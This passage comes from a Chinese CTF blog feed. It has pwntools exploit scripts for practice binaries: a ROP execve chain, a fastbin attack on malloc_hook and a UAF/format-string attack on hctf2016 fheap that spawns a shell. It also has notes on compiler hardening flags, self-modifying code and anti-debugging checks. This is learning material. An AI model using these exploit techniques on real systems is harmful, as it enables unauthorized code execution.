class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># execve generated by ROPgadget</span><br>from pwn import *<br>from struct import <span class="hljs-keyword">pack</span><br><br><span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">&#x27;&#x27;</span><br><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b91e6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080557ab</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b91e6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080557ab</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049463</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080557ab</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481ad</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc31</span>) <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># padding without overwrite ebx</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049463</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806d7e5</span>) <span class="hljs-comment"># int 0x80</span><br>a = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-attribute">debug</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">a</span> = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">a</span> = remote(&#x27;node<span class="hljs-number">3</span>.buuoj.cn&#x27;,<span class="hljs-number">29354</span>)<br><span class="hljs-attribute">pay</span> = &#x27;a&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">38</span> + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">80489</span>A<span class="hljs-number">0</span>) + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">308</span>CD<span class="hljs-number">64</span>F)*<span class="hljs-number">2</span> + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">195719</span>D<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-attribute">a</span>.sendline(pay)<br><span class="hljs-attribute">a</span>.interactive()<br></code></pre></td></tr></table></figure><p>远程环境有毛病只能shellcode了</p><h2 id="cgctf-note"><a href="#cgctf-note" class="headerlink" title="cgctf note"></a>cgctf note</h2><p>有些地方还是没有完全搞懂<br>大致攻击流程复现了下</p><h3 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h3><p>首先分配大小超过0x80的堆块free后show来leak//因为程序没有检查show时分配的堆块还是否存在<br>调试发现leak地址位于main_arena+88处<br><img src="39.png" alt="39"><br>libc_base就是leak地址-(main_arena+88)</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>通过修改fd指针指向malloc_hook<br>再edit到onegadget处调用一次malloc即可</p><p>脚本如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./note3&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&quot;45.76.173.177&quot;</span>,<span class="hljs-number">6666</span>)<br><br>def <span class="hljs-built_in">add</span>(x,y):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(y))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Content:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(x)<br>def show(x):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(x)<br>def edit(x,y):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(y))<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(x)<br>def <span class="hljs-built_in">delete</span>(x):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(x)<br><br>one_gadget = <span class="hljs-number">0xd694f</span><br>area = <span class="hljs-number">0x397B00</span><br>malloc_hook = <span class="hljs-number">0x397AF0</span><br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-built_in">delete</span>(<span class="hljs-string">&#x27;0&#x27;</span>)<br>show(<span class="hljs-string">&#x27;0&#x27;</span>)<br>libc = temp = u64(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)) - area - <span class="hljs-number">88</span><br>one_gadget += libc<br>malloc_hook += libc<br>print <span class="hljs-string">&#x27;libc_base:&#x27;</span>+hex(libc)<br>print <span class="hljs-string">&#x27;one_gadget:&#x27;</span>+hex(one_gadget)<br>print <span class="hljs-string">&#x27;malloc_hook:&#x27;</span>+hex(malloc_hook)<br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span>,<span class="hljs-number">96</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-string">&#x27;2&#x27;</span>)<br>edit(p64(malloc_hook<span class="hljs-number">-0x23</span>),<span class="hljs-number">2</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-number">96</span>)<br>pay = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br><span class="hljs-built_in">add</span>(pay,<span class="hljs-number">96</span>)<br>gdb.attach(<span class="hljs-keyword">a</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="hctf2016–fheap"><a href="#hctf2016–fheap" class="headerlink" title="hctf2016–fheap"></a>hctf2016–fheap</h2><p>简单的UAF<br>分析出程序的结构体后发现free后未置0<br>利用uaf可以先分配三个小堆块然后分配0x20正好能覆盖到结构体中的指针<br>因为开启了pie通过覆盖低位为puts函数<br>下面就能调用delete函数leak出libc<br>然后整出system地址后重复一次攻击即可</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./fheap&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&quot;45.76.173.177&quot;</span>,<span class="hljs-number">6666</span>)<br><br>def <span class="hljs-built_in">create</span>(x,y):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;3.quit&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;create &quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Pls give string size:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(y))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;str:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(x)<br>def <span class="hljs-built_in">delete</span>(x):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;3.quit&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;delete &quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;id:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(x))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Are you sure?:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;yes&quot;</span>)<br>def leak(addr):<br>    <span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>    data=<span class="hljs-string">&#x27;aa%9$s&#x27;</span>+<span class="hljs-string">&#x27;#&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;aa%9$s&#x27;</span>))+p64(printf_plt)<br>    <span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;quit&quot;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(<span class="hljs-string">&quot;delete &quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;id:&#x27;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(str(<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;sure?:&#x27;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;yes01234&#x27;</span>+p64(addr))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>    data=<span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;####&#x27;</span>)[:<span class="hljs-number">-4</span>]<br>    data += <span class="hljs-string">&quot;\x00&quot;</span><br>    <span class="hljs-literal">return</span> data<br><br><span class="hljs-built_in">create</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)<br><span class="hljs-built_in">create</span>(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)<br><span class="hljs-built_in">create</span>(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>data = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;\x2D&#x27;</span><br><span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<span class="hljs-number">-0xd2d</span><br>printf_plt = libc_base + <span class="hljs-number">0x9D0</span><br><span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>data = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;\x2D&#x27;</span><br><span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>data = u64(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>d = DynELF(leak, libc_base, elf=ELF(<span class="hljs-string">&#x27;./fheap&#x27;</span>))<br>system_addr = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>print <span class="hljs-string">&#x27;**********leak**********&#x27;</span><br>print <span class="hljs-string">&#x27;leak_libc_base:&#x27;</span> + hex(libc_base)<br>print <span class="hljs-string">&#x27;leak_printf_plt:&#x27;</span> + hex(printf_plt)<br>print <span class="hljs-string">&quot;system_addr:&quot;</span> + hex(system_addr)<br>print <span class="hljs-string">&#x27;************************&#x27;</span><br>data = <span class="hljs-string">&quot;/bin/sh;&quot;</span><br>data += <span class="hljs-string">&#x27;1&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-built_in">len</span>(data))<br>data += p64(system_addr)<br><span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br>print <span class="hljs-string">&#x27;*********attack*********&#x27;</span><br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>暑假学习随笔</title>
    <link href="/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"/>
    <url>/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>如何荒废一暑假23333<br>暑假玩太爽了都没怎么学习<br>这篇博客记录一下我从7月14到8月24这几天来的学习把<br>//没学多少，大部分时间都在玩。<br>所以tcl</p><a id="more"></a><h1 id="pwn出题"><a href="#pwn出题" class="headerlink" title="pwn出题"></a>pwn出题</h1><p>gcc -m32 hello.c    指定32位<br>gcc stack.c -fno-stack-protector -no-pie -o stack<br>NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了<br>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息<br>PIE：-no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk<br>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限</p><h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p>简单的花就那样还是挺好分辨的<br>像什么jnz jz配合啥的<br>还有垃圾跳转等等<br>还是要具体问题具体分析<br>看题目的花是咋样的</p><h1 id="smc"><a href="#smc" class="headerlink" title="smc"></a>smc</h1><p>用VirtualProtect(addr,size,PAGE_READWRITE,lpflOldProtect)修改代码段权限<br>传入的addr定义为unsigned char*使得可以逐字节加密<br>最后再次调用VirtualProtect(addr,size,lpflOldProtect,lpflOldProtect)还原代码段权限<br>靠函数指针实现<br>这个比较熟悉了。。。<br>一般出题的话都是写个解密函数<br>加密代码时直接在ida里patchbyte<br>如果说要改进的话<br>可以试一下双重smc<br>把加密的函数也给smc了这样就不能通过交叉引用来找到加密代码<br>但效果没那么明显。。。</p><h1 id="反跟踪"><a href="#反跟踪" class="headerlink" title="反跟踪"></a>反跟踪</h1><h2 id="IsDebuggerpresent"><a href="#IsDebuggerpresent" class="headerlink" title="IsDebuggerpresent"></a>IsDebuggerpresent</h2><p>通过读取PEB中的BeingDebugged标志来判断是否在调试<br>BeingDebugged位于PEB偏移2的位置<br>然而PEB又位于TEB偏移0x30位置，所以可以通过TEB来定位PEB<br>而当windows加载程序时<br>TEB的位置总会被加载到fs:[0]处<br>所以IsDebuggerpresent也能写成</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">__asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;movzx eax,byte ptr [eax+2];&quot;</span><br>    );<br>    <span class="hljs-regexp">//</span>IsDebuggerpresent内联汇编实现<br></code></pre></td></tr></table></figure><h2 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h2><p>与BeingDebugged类似<br>当程序在调试时<br>NtGlobalFlag标志应为0x70<br>故有另一种IsDebuggerpresent写法</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;mov eax,[eax+0x68];&quot;</span><br>        <span class="hljs-string">&quot;and eax,0x70;&quot;</span><br>    )<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="Heap-Magic"><a href="#Heap-Magic" class="headerlink" title="Heap Magic"></a>Heap Magic</h2><p>这是在x1c面试题中出现的<br>算是一个暗桩<br>不能说是反调试，但是能改变某些东西。<br>可以直接写代码康康测试下</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-built_in">int</span> main()<br>&#123;<br>    <span class="hljs-built_in">int</span> *a<span class="hljs-comment">;</span><br>    a = malloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">;</span><br>    printf(<span class="hljs-string">&quot;%x&quot;</span>,*a)<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>调试情况下就能看到0xBAADF00D在内存中了<br><img src="1.png" 